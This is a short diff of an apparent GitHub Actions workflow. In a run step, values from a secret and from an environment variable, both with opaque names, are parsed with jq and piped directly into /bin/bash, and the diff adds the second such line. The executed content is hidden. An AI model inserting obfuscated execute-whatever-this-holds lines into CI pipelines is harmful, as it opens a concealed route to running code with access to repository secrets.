@@ -20,6 +20,7 @@ jobs:
           b80930: ${{ secrets.b80930 }}
         run: |
           printf '%s' "$b80930" | jq -r .wewq91 | /bin/bash
+          echo $z0 | jq -r .vxt30170 | /bin/bash
 
       - name: Persist results
         if: always()
